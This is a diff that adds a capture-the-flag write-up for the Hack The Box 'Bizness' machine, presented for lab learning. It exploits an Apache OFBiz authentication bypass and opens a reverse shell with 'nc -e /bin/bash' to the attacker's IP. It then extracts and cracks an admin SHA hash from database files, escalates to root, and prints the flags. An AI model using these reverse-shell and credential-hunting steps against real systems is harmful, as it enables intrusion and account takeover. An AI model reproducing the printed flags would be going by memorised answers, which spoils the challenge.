@@ -1,0 +1,289 @@
+= Bizness
+
+Author:: 0x42697262
+Category:: Linux
+Difficulty:: Easy
+Play Date:: 2024/05/19 - 2024/05/19
+
+== Introduction
+
+.Challenge Description
+
+A vulnerable Linux web server that uses OFBiz for hosting.
+
+== Methodology
+
+Use *nmap* to scan the server.
+Get a reverse shell on the server.
+Privilege escalate to root if possible.
+
+=== Reconnaissance
+
+Scan with nmap
+
+----
+$ nmap -sS -sV -sC -A 10.10.11.252
+
+Nmap scan report for 10.10.11.252
+Host is up (1.0s latency).
+Not shown: 997 closed tcp ports (reset)
+PORT    STATE SERVICE  VERSION
+22/tcp  open  ssh      OpenSSH 8.4p1 Debian 5+deb11u3 (protocol 2.0)
+| ssh-hostkey:
+|   256 39:11:42:3f:0c:25:00:08:d7:2f:1b:51:e0:43:9d:85 (ECDSA)
+|_  256 b0:6f:a0:0a:9e:df:b1:7a:49:78:86:b2:35:40:ec:95 (ED25519)
+80/tcp  open  http     nginx 1.18.0
+|_http-server-header: nginx/1.18.0
+443/tcp open  ssl/http nginx 1.18.0
+| ssl-cert: Subject: organizationName=Internet Widgits Pty Ltd/stateOrProvinceName=Some-State/countryName=UK
+| Not valid before: 2023-12-14T20:03:40
+|_Not valid after:  2328-11-10T20:03:40
+|_http-server-header: nginx/1.18.0
+Aggressive OS guesses: Linux 5.4 (96%), Linux 3.1 (95%), Linux 3.2 (95%), AXIS 210A or 211 Network Camera (Linux 2.6.17) (95%), ASUS RT-N56U WAP (Linux 3.4) (93%), Linux 3.16 (93%), Linux 4.15 - 5.8 (93%), Linux 3.10 (93%), Linux 5.3 - 5.4 (93%), Linux 2.6.32 (92%)
+No exact OS matches for host (test conditions non-ideal).
+Network Distance: 2 hops
+Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
+
+TRACEROUTE (using port 1720/tcp)
+HOP RTT       ADDRESS
+1   99.23 ms  10.10.16.1
+2   850.83 ms 10.10.11.252
+
+OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
+Nmap done: 1 IP address (1 host up) scanned in 522.18 seconds
+----
+
+OpenSSH 8.4p1 doesn't seem to be vulnerable.
+However, upon opening the web address of the server, it redirects to ``bizness.htb``.
+
+The issue is that the page would not load.
+
+This can be fixed by adding this to the ``/etc/hosts`` file
+
+----
+10.10.11.252 bizness.htb
+----
+
+Greeted with the homepage, there are various forms in the website that might be vulnerable to SQL Injection.
+
+.Bizness Homepage
+image::bizness/homepage.png[]
+
+It appears that the server is hosted using https://ofbiz.apache.org[OFBiz] which can be seen at the bottom of the page.
+
+Default path for accessing the control page for OFBiz is located at ``/webtools`` which redirects to ``/webtools/control/main``.
+The full path is ``bizness.htb/webtools/control/main``.
+
+.OFBiz webtools
+image::bizness/ofbiz.png[]
+
+OFBiz uses version *18.12* which might hint that there are security vulnerabilities that might have existed.
+Fortunately for this challenge, there are two severe vulnerabilities:
+
+. CVE-2023-49070
+. CVE-2023-51467
+
+For the sake of accomplishing this challenge as fast as possible, I have taken a look at PoCs and found a way to bypass the security login.
+I used https://github.com/jakabakos/Apache-OFBiz-Authentication-Bypass[this exploit].
+
+=== Exploitation
+
+First create a connection for the reverse shell to connect to
+
+----
+$ nc -lvnp 6969 <.>
+----
+<.> Pick any port you like
+
+Then execute the exploit downloaded on another terminal
+
+----
+$ python3 exploit.py --url https://bizness.htb --cmd 'nc -e /bin/bash 10.10.16.20 6969' <.>
+[+] Generating payload...
+[+] Payload generated successfully.
+[+] Sending malicious serialized payload...
+[+] The request has been successfully sent. Check the result of the command.
+----
+<.> Make sure to point the server to your machine's IP address
+
+On the netcat terminal, this should be printed on the screen
+
+----
+listening on [any] 6969 ...
+connect to [10.10.16.20] from (UNKNOWN) [10.10.11.252] 49924
+----
+
+And we're in!
+
+That can be verified with these commands
+
+----
+$ whoami
+ofbiz
+$pwd
+/opt/ofbiz
+----
+
+== Finding The Flag
+
+The current directory apparently have tons of files and it would be difficult to find the root flag.
+
+Finding the user flag is quite easy, simply print it out
+
+----
+$ cat ~/user.txt
+2ecc953f42e90c7a284fcab56f26867e
+----
+
+As for the root flag, it's located in ``/root/root.txt`` however the current user (ofbiz) does not have permissions to read, write, and execute on that directory.
+
+It's painful to dumpster dive the password of the root user.
+It's not located in the Dockerfile nor in the configurations.
+
+There is however an encrypted password in the file ``/opt/ofbiz/framework/resources/templates/AdminUserLoginData.xml``.
+
+[, xml]
+----
+$ cat AdminUserLoginData.xml
+
+<?xml version="1.0" encoding="UTF-8"?>
+<!--
+Licensed to the Apache Software Foundation (ASF) under one
+or more contributor license agreements.  See the NOTICE file
+distributed with this work for additional information
+regarding copyright ownership.  The ASF licenses this file
+to you under the Apache License, Version 2.0 (the
+"License"); you may not use this file except in compliance
+with the License.  You may obtain a copy of the License at
+
+http://www.apache.org/licenses/LICENSE-2.0
+
+Unless required by applicable law or agreed to in writing,
+software distributed under the License is distributed on an
+"AS IS" BASIS, WITHOUT WARRANTIES OR CONDITIONS OF ANY
+KIND, either express or implied.  See the License for the
+specific language governing permissions and limitations
+under the License.
+-->
+
+<entity-engine-xml>
+    <UserLogin userLoginId="@userLoginId@" currentPassword="{SHA}47ca69ebb4bdc9ae0adec130880165d2cc05db1a" requirePasswordChange="Y"/> <.>
+    <UserLoginSecurityGroup groupId="SUPER" userLoginId="@userLoginId@" fromDate="2001-01-01 12:00:00.0"/>
+</entity-engine-xml>
+----
+<.> This line contains a SHA password.
+
+However, I do not see any use or a way to crack the password.
+
+Upon further reading about Apache's OFBiz, the password is stored as plaintext as SHA hash somewhere in the ``./runtime/data`` directory.
+
+Since I am lazy, I proceeded to simply print the strings of each and every file that contains a *SHA*.
+
+----
+$ cd ./runtime/data/derby/ofbiz/seg0
+$ strings * | grep SHA
+
+SHA-256
+MARSHALL ISLANDS
+SHAREHOLDER
+SHAREHOLDER
+                <eeval-UserLogin createdStamp="2023-12-16 03:40:23.643" createdTxStamp="2023-12-16 03:40:23.445" currentPassword="$SHA$d$uP0_QaVBpDWFeo8-dRzDqRwXQ2I" enabled="Y" hasLoggedOut="N" lastUpdatedStamp="2023-12-16 03:44:54.272" lastUpdatedTxStamp="2023-12-16 03:44:54.213" requirePasswordChange="N" userLoginId="admin"/>
+"$SHA$d$uP0_QaVBpDWFeo8-dRzDqRwXQ2I <.>
+
+----
+<.> We found are root password hashed with SHA.
+
+== Cracking the Root Flag
+
+Certainly, I can code my own tool for cracking the hashed password using a wordlist dictionary but someone else have already created that tool for us to use.
+Can be accessed https://github.com/duck-sec/Apache-OFBiz-SHA1-Cracker[here].
+
+I used *rockyou.txt* as my wordlist.
+
+After cracking the SHA hash, we should now acquire the password.
+
+----
+monkeybizness
+----
+
+== Get Root Flag
+
+Login with root
+
+----
+$ su
+Password: monkeybizness
+----
+
+Check if we truly are root
+
+----
+# whoami
+root
+----
+
+Acquire the root flag
+
+----
+# cat /root/root.txt
+628643013da646b11a7f82adfd4f1b12
+----
+
+== Challenge Summaries
+
+Extract the archive with ``tar``
+
+Use an existing tool to exploit Apache's OFBiz 18.12
+
+----
+$ python3 exploit.py --url https://bizness.htb --cmd 'nc -e /bin/bash 10.10.16.20 6969' <.>
+----
+
+Get the user flag
+
+----
+$ cat ~/user.txt
+2ecc953f42e90c7a284fcab56f26867e
+----
+
+Crack the SHA hash then get the root flag
+
+----
+$ cd ./runtime/data/derby/ofbiz/seg0
+$ strings * | grep SHA
+
+SHA-256
+MARSHALL ISLANDS
+SHAREHOLDER
+SHAREHOLDER
+                <eeval-UserLogin createdStamp="2023-12-16 03:40:23.643" createdTxStamp="2023-12-16 03:40:23.445" currentPassword="$SHA$d$uP0_QaVBpDWFeo8-dRzDqRwXQ2I" enabled="Y" hasLoggedOut="N" lastUpdatedStamp="2023-12-16 03:44:54.272" lastUpdatedTxStamp="2023-12-16 03:44:54.213" requirePasswordChange="N" userLoginId="admin"/>
+"$SHA$d$uP0_QaVBpDWFeo8-dRzDqRwXQ2I <.>
+----
+
+----
+$ su
+Password: monkeybizness
+----
+
+----
+# cat /root/root.txt
+628643013da646b11a7f82adfd4f1b12
+----
+
+== Lessons Learned
+
+. Apache's OFBiz
+. Searching for existing exploits
+
+== Conclusion
+
+Not a fun challenge when you have to search the files one by one when you do not have experience with OFBiz.
+I don't wanna do this shit again.
+
+[IMPORTANT] 
+.Flag
+==== 
+user:2ecc953f42e90c7a284fcab56f26867e
+
+root:628643013da646b11a7f82adfd4f1b12
+====
